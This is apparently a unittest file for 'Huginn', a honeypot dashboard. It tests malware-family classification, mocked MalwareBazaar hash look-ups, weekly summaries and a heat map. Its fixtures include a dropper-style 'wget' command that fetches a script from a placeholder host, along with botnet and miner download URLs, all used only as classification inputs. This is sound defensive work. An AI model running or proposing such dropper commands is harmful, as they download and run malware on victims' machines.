# Malware families, MalwareBazaar look-ups, "New this week", the Sunday summary and the heat map.
import io, json, time, unittest
from datetime import datetime

from tests.helpers import app

SHA = "f1" * 32
NOW = time.time()


def row(ip, kind, session=None, a=None, b=None, ago=3600.0, src="cowrie"):
    ts = NOW - ago
    return ("ins|%s|%s|%s|%s|%s|%s" % (ts, ip, kind, session, a, b), ts, ip, src, kind, session, a, b)


class Families(unittest.TestCase):
    def test_from_names(self):
        self.assertEqual(app.name_family("http://203.0.113.5/Mozi.m"), "Mozi (P2P botnet)")
        self.assertEqual(app.name_family("cd /tmp; wget http://x/bins.sh"), "Dropper script")
        self.assertEqual(app.name_family("/tmp/kdevtmpfsi"), "Crypto miner")
        self.assertEqual(app.name_family("harmless.txt"), "")

    def test_priority(self):
        con = app.connect()
        app.store_files(con, [{"sha": SHA, "size": 10, "type": "ELF 32-bit", "arch": "arm", "family": "Mirai", "iocs": []}])
        f = con.execute("SELECT * FROM files WHERE sha=?", (SHA,)).fetchone()
        self.assertEqual(app.file_family(f, "x/Mozi.m"), ("Mirai", "strings in the file"))
        with con:
            con.execute("UPDATE files SET mb=? WHERE sha=?", (json.dumps({"found": True, "signature": "Mozi"}), SHA))
        f = con.execute("SELECT * FROM files WHERE sha=?", (SHA,)).fetchone()
        self.assertEqual(app.file_family(f), ("Mozi", "MalwareBazaar"))
        # A new sync must not wipe the MalwareBazaar answer.
        app.store_files(con, [{"sha": SHA, "size": 10, "type": "ELF 32-bit", "arch": "arm", "family": "Mirai", "iocs": []}])
        self.assertIn("Mozi", con.execute("SELECT mb FROM files WHERE sha=?", (SHA,)).fetchone()[0])
        self.assertEqual(app.file_family(None, "http://x/redtail.arm7")[0], "RedTail (miner)")


class MalwareBazaar(unittest.TestCase):
    def test_lookup_only_with_a_key_and_only_the_hash(self):
        con = app.connect()
        sha2 = "a2" * 32
        app.store_files(con, [{"sha": sha2, "size": 5, "type": "data", "iocs": []}])
        self.assertEqual(app.mb_lookup(con), 0)                       # no key: nothing leaves Huginn
        sent = []

        class Resp(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        def fake_urlopen(req, timeout=0):
            sent.append((req.full_url, req.data.decode(), req.get_header("Auth-key")))
            h = dict(x.split("=") for x in req.data.decode().split("&"))["hash"]
            body = {"query_status": "ok", "data": [{"signature": "Gafgyt", "tags": ["elf", "gafgyt"]}]} if h == sha2 else {"query_status": "hash_not_found"}
            return Resp(json.dumps(body).encode())

        orig_key, orig_open = app.MB_KEY, app.urllib.request.urlopen
        app.MB_KEY, app.urllib.request.urlopen = "test-key", fake_urlopen
        try:
            n = app.mb_lookup(con, limit=50)
        finally:
            app.MB_KEY, app.urllib.request.urlopen = orig_key, orig_open
        self.assertGreaterEqual(n, 1)
        self.assertTrue(all(u == "https://mb-api.abuse.ch/api/v1/" and k == "test-key" and d.startswith("query=get_info&hash=") for u, d, k in sent))
        f = con.execute("SELECT * FROM files WHERE sha=?", (sha2,)).fetchone()
        self.assertEqual(app.file_family(f)[0], "Gafgyt")


class Weekly(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.con = app.connect()
        app.store(cls.con, [
            row("198.51.100.90", "connect", "w1", "ssh", "2225", ago=2 * 86400),
            row("198.51.100.90", "login_ok", "w1", "root", "weekly-pw-1", ago=2 * 86400 - 1),
            row("198.51.100.90", "file", "w1", "http://203.0.113.9/Mozi.m", "b3" * 32, ago=2 * 86400 - 2),
            row("198.51.100.91", "connect", "w2", "ssh", "2225", ago=10 * 86400),
        ])

    def test_summary(self):
        w = app.week_summary(self.con, NOW - 7 * 86400, NOW)
        self.assertGreaterEqual(w["active"], 1)
        self.assertGreaterEqual(w["new_ips"], 1)
        self.assertIn("Mozi (P2P botnet)", w["families"])
        self.assertIn("New this week", app.week_card(self.con))

    def test_digest_once_on_sunday_evening(self):
        sent = []

        class Sunday(datetime):
            @classmethod
            def now(cls, tz=None):
                return datetime(2026, 11, 8, 19, 0, tzinfo=tz)        # a Sunday, 19:00

        orig = (app.NTFY_URL, app.ntfy_post, app.datetime)
        app.NTFY_URL, app.ntfy_post, app.datetime = "http://ntfy.invalid/t", lambda body, title, prio=3: sent.append((title, body)), Sunday
        app.set_meta(self.con, "weekly_sent", "")
        try:
            app.weekly_digest(self.con)
            app.weekly_digest(self.con)                                # same week: not again
        finally:
            app.NTFY_URL, app.ntfy_post, app.datetime = orig
        self.assertEqual(len(sent), 1)
        self.assertEqual(sent[0][0], "Huginn: week 45")
        self.assertIn("attackers", sent[0][1])
        self.assertIn("Mozi", sent[0][1])


class HeatMap(unittest.TestCase):
    def test_grid(self):
        con = app.connect()
        grid = app.heatmap(con)
        self.assertEqual((len(grid), len(grid[0])), (7, 24))
        self.assertGreater(sum(map(sum, grid)), 0)
        html = app.heat_html(grid)
        self.assertEqual(html.count('class="hm-row"'), 7)
        self.assertNotIn("style=", html)


class SettingsUpgrade(unittest.TestCase):
    def test_old_settings_get_the_new_cards_once(self):
        con = app.connect()
        old = app.get_meta(con, "settings", "{}")
        try:
            app.set_meta(con, "settings", json.dumps({"cards": ["chart", "top"], "notify_events": ["bait"]}))
            st = app.settings(con)
            self.assertEqual(st["cards"], ["hero", "chart", "top", "week", "heatmap"])
            self.assertIn("weekly", st["notify_events"])
            app.set_meta(con, "settings", json.dumps({"cards": ["chart"], "notify_events": [], "v": 3}))
            self.assertEqual(app.settings(con)["cards"], ["chart"])      # a later choice is respected
        finally:
            app.set_meta(con, "settings", old)


if __name__ == "__main__":
    unittest.main()
